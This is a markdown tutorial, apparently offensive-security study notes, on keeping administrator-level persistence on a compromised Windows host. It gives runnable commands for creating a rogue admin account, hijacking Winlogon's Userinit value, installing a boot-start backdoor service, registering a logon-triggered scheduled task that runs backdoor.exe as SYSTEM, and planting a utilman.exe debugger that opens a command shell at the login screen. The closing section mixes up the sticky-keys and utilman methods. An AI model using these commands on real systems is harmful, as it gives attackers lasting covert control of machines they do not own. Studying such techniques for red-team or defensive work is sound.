# High Privilege User Persistence 

## Overview
This is the same objective as establishing a lower-privilege user's persistence, however it can be even easier as you have administrative access over the system. 

## Creating another administrator user

1. Drop into a shell and create a new user. The syntax is: 

	net user /add [USERNAME] [PASSWORD].  

2. Now just add the username to the local administrators' group. 

	net localgroup Administrators [USERNAME] /add

3. By checking the users that are in the Administrators' group we can see our newly created and added user:

	net localgroup Administrators

## Editing Registries 

We can backdoor the Winlogon so when a user logs in our backdoor will get executed. The registry used is: 

	HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

1. Upload the backdoor if you haven't and add the registry entry. The command is: 

	reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, [PATH_TO_BINARY]" /f

When a user logs in Userinit.exe will be executed and then our backdoor.

## Persistence by creating a service 

There is the possibility to create a service leveraging Powershell which will execute our backdoor.

1. Load Powershell into the meterpreter instance by typing:

	load powershell 

2. To drop into a Powershell shell type: 

	powershell_shell

3. Create the service using the New-Service cmdlet: 

	New-Service -Name "[SERVICE_NAME]" -BinaryPathName "[PATH_TO_BINARY]" -Description "[SERVICE_DESCRIPTION]" -StartupType "Boot"

The service will start stopped, but by checking the services you can notice that the service will start automatically

## Scheduled tasks

Scheduled tasks are used to schedule the launch of specific programs or scripts at a pre-defined time or when it meets a condition (Ex: a user logs in).

Powershell can be used to create a scheduled task and assure persistence but for that, we'll have to define multiple cmdlets. These are:

* New-ScheduledTaskAction - Is used to define the action that is going to be made.

* New-ScheduledTaskTrigger - Defining the trigger (daily/weekly/monthly, etc). The trigger can be considered a condition that when met the scheduled task will launch the action.

* New-ScheduledTaskPrincipal - Is the user that the task will be run as.

* New-ScheduledTaskSettingsSet - This will set our above-mentioned settings.

* Register-ScheduledTask - Will create the task.

### Example

Knowing this let's create the task using Powershell.

1. Load into a powershell terminal 

2. Set the cmdlets:

	1. $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Administrator\Desktop\backdoor.exe
	2. $B = New-ScheduledTaskTrigger -AtLogOn
	3. $C = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -RunLevel Highest
	4. $D = New-ScheduledTaskSettingsSet

Then set and schedule them:

	5. $E = New-ScheduledTask -Action $A -Trigger $B -Principal $C -Settings $D
	6. Register-ScheduledTask backdoor -InputObject $E

## Backdooring RDP

An example would be using Metasploit to backdoor OSK (On-screen keyboard). The Metasploit sticky_keys module can be used:

1. Sign out/Lock the account and press Windows Key + U and choose On-screen keyboard. A CMD should be prompted.

2. The same results can be achieved by editing the registry using the command:

	REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f



